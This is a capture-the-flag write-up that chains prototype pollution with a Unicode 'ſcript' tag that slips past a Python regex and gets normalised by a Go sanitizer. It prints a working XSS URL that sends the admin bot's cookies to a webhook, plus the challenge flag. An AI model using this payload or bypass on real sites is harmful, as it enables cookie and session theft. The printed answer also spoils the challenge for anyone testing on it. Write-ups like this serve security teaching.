# Demolition CTF Solution Walkthrough

## 1. Initial Analysis
The given challenge consisted of a web application built in Python (Flask) with a Node.js admin bot and a Go-based HTML sanitizer. Exploring `app.py`, `bot.js`, and the frontend `client.js` revealed the following flow:
1. The app renders a templated `index.html` allowing users to inject a profile blob `p`, draft HTML `d`, and template markers `tpl`.
2. The bot is an open redirect that sets a `FLAG` cookie (without `httpOnly`) on `demolition.breakable.live` and navigates to a user-controlled URL.
3. The objective was to trigger an XSS vulnerability on `demolition.breakable.live` to exfiltrate `document.cookie`.

## 2. Client-Side Prototype Pollution
The frontend `client.js` has a custom profile parsing implementation (`getProfile`, `forgeRuntime`, `collectLeafPaths`, `writePath`) that merges dot-separated user input into an object.
Providing the query parameter `p=__proto__.engine=go` forces the Python backend to emit a JSON object with `__proto__` as a key: `{"__proto__": {"engine": "go"}}`. 
When `client.js` flattens this, it literally builds a path `__proto__.engine`. Then, supplying `tpl={{__proto__.engine}}` triggers the `routeManifestPaths` function to add the path to the set of valid routes, eventually calling `writePath(lane, "__proto__.engine", "go")`.

This pollutes the `Object.prototype`, setting `Object.prototype.engine = "go"`, which tricks the script into routing our draft HTML `d` to the backend's Go sanitizer instead of the default Python sanitizer.

## 3. Bypassing the XSS Filter
To stop direct `<script>` injections, the Python backend checks:
`SCRIPT_FENCE_RE = re.compile(r"<\s*/?\s*script\b", re.IGNORECASE | re.ASCII)`

However, when `engine=go`, the payload is sent to `go-sanitizer`. The Go sanitizer only permits tags matching `"script"`, validated via `strings.EqualFold()`. 
Because `strings.EqualFold` applies full Unicode case folding, we can use the "Latin Small Letter Long S" (`ſ` - U+017F) which folds to `s`. 
Injecting `<ſcript>` evades the Python ASCII regex, but the Go sanitizer recognizes it as `<script>` and reconstructs the tag cleanly, neutralizing any mitigation. 

## 4. Exploitation and Flag Extraction
With the two vulnerabilities chained together, the final exploit used a webhook to steal the bot's cookies:
`https://demolition.breakable.live/?p=__proto__.engine=go&tpl={{__proto__.engine}}&d=<ſcript>window.location='https://webhook.site/UUID?c='%2Bbtoa(document.cookie)</ſcript>`

We fired a browser subagent to generate a webhook URL and submit this encoded exploit URL to the bot at `https://demolition-bot.breakable.live/`. 

The bot visited the page, the prototype pollution diverted the pipeline to Go, the unicode tag bypassed the Python regex, the Go sanitizer outputted a valid inline `<script>`, and the webhook received the flag!

**FLAG:** `CTF{7b5d3e42e57dab38821b5215138825098cbe965c67c131b6c64be1805626481d}`
